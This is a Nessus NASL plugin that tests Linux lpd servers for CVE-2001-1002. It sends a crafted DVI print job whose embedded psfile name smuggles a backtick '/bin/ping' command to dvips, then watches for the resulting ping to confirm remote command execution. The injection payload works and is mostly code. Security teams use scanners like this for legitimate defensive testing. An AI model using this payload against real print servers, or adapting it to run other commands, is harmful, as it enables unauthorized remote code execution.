#
# (C) Tenable Network Security, Inc.
#
include("compat.inc");

if (description)
{
  script_id(11023);
  script_version ("1.24");
  script_cvs_date("Date: 2019/03/06 18:38:55");

  script_cve_id("CVE-2001-1002");
  script_bugtraq_id(3241);

  script_name(english:"Linux lpd DVI Print Filter (dvips) Remote Command Execution");
  script_summary(english:"Executes 'ping' on the remote host");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a remote buffer overflow vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote lpd server calls dvips in insecure mode. An attacker may 
use this flaw to execute arbitrary commands remotely on this host." );
  script_set_attribute(attribute:"see_also", value:"https://marc.info/?l=bugtraq&m=99892644616749&w=2" );
  script_set_attribute(attribute:"solution", value:
"Edit /usr/lib/rhs/rhs-printfilters/dvi-to-ps.fpi
and change the line that specifies how 'dvips' is
to be executed from  :
dvips -f $DVIPS_OPTIONS < $TMP_FILE 
to
dvips -R -f $DVIPS_OPTIONS < $TMP_FILE" );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value: "2001/08/27");
  script_set_attribute(attribute:"plugin_publication_date", value: "2002/06/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2002-2019 Tenable Network Security, Inc.");

  script_require_ports("Services/lpd", 515);
  script_dependencies("find_service1.nasl");

  exit(0);
}
include("audit.inc");

port = get_kb_item("Services/lpd");
if (!port)port = 515;

if (!get_port_state(port)) audit("AUDIT_PORT_CLOSED", port);

soc = open_priv_sock_tcp(dport:port);
if (!soc) audit("AUDIT_SOCK_FAIL", port, "LDP");


CR = raw_string(0x0A);
a = raw_string(0x02) +  "lp" + CR;

send(socket:soc, data:a);
r = recv(socket:soc, length:1);
if (!r) audit("AUDIT_RESP_NOT", port);
if (ord(r)) audit("AUDIT_FN_FAIL", "ord()");


name = get_host_name();
ip = compat::this_host();


len = strlen(ip);
len = len + 26;
len = len % 256;

#
# This is a .dvi file, containing a reference to a postscript file
# called 'ping -c 10 <ourip>'.
#
data = raw_string(0xF7, 0x02, 0x01, 0x83, 0x82, 0xC0,
       0x1C, 0x3B, 0x00, 0x00, 0x00, 0x00, 0x03, 0xE8,
       0x1B, 0x20, 0x54, 0x65, 0x58, 0x20, 0x6F, 0x75,
       0x74, 0x70, 0x75, 0x74, 0x20, 0x32, 0x30, 0x30,
       0x32, 0x2E, 0x30, 0x36, 0x2E, 0x30, 0x38, 0x3A,
       0x32, 0x30, 0x30, 0x35, 0x8b, 0x00, 0x00, 0x00,
       0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
       0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
       0xFF, 0x8D, 0x9F, 0xF2, 0x00, 0x00, 0x8E, 0xA0,
       0x02, 0x83, 0x33, 0xDA, 0x8D, 0xA0, 0xFD, 0x7C,
       0xCC, 0x26, 0xEF, len, 0x70, 0x73, 0x66, 0x69,
       0x6C, 0x65, 0x3D, 0x22, 0x60, 0x2F, 0x62, 0x69,
       0x6E, 0x2F, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x2D,
       0x63, 0x20, 0x31, 0x30, 0x20) +
       ip +
       raw_string(0x22, 0x8E, 0x9F, 0x18, 0x00, 0x00,
       0x8D, 0x92, 0x00, 0xE8, 0x60, 0xA3, 0xF3, 0x00,
       0x4B, 0xF1, 0x60, 0x79, 0x00, 0x0A, 0x00, 0x00,
       0x00, 0x0A, 0x00, 0x00, 0x00, 0x05, 0x63, 0x6D,
       0x72, 0x31, 0x30, 0xAB, 0x31, 0x8E, 0x8C, 0xF8,
       0x00, 0x00, 0x00, 0x2A, 0x01, 0x83, 0x92, 0xC0,
       0x1C, 0x3B, 0x00, 0x00, 0x00, 0x00, 0x03, 0xE8,
       0x02, 0x9B, 0x33, 0xDA, 0x01, 0xD5, 0xC1, 0x47,
       0x00, 0x02, 0x00, 0x01, 0xF3, 0x00, 0x4B, 0xF1,
       0x60, 0x79, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x0A,
       0x00, 0x00, 0x00, 0x05, 0x63, 0x6D, 0x72, 0x31,
       0x30, 0xF9, 0x00, 0x00, 0x00, 0xB0, 0x02, 0xDF,
       0xDF, 0xDF, 0xDF);

cmd = raw_string(0x03) + string(strlen(data) ," dfA081", name) + CR;

send(socket:soc, data:cmd);
r = recv(socket:soc, length:1);
if (isnull(r)) audit("AUDIT_RESP_NOT", port);
if (ord(r)) audit("AUDIT_FN_FAIL", "ord()");



send(socket:soc, data:data);
send(socket:soc, data:raw_string(0));
r = recv(socket:soc, length:1);
if (isnull(r)) audit("AUDIT_RESP_NOT", port);
if (ord(r)) audit("AUDIT_FN_FAIL", "ord()");


cmd = string("Hlocal", CR, "Pnessus", CR, "fdfA081", name, CR,
             "UdfA081", name, CR, "Nsploit.dvi", CR);
cmd1 = raw_string(0x02) + string(strlen(cmd), " cfA081", name) + CR;
send(socket:soc, data:cmd1);

r = recv(socket:soc, length:1);
if (isnull(r)) audit("AUDIT_RESP_NOT", port);
if (ord(r)) audit("AUDIT_FN_FAIL", "ord()");

send(socket:soc, data:cmd);
send(socket:soc, data:raw_string(0));
r = recv(socket:soc, length:1);
close(soc);

#
# We asked the remote host to execute '/bin/ping -c 10 <us>'. We now
# wait for the reply.
#
filter = string("icmp and src host ", get_host_ip(), " and dst host ", ip, " and icmp[0] = 8");
pkt = pcap_next(pcap_filter:filter);

if(pkt) security_hole(port);
else audit("AUDIT_HOST_NOT", "affected");
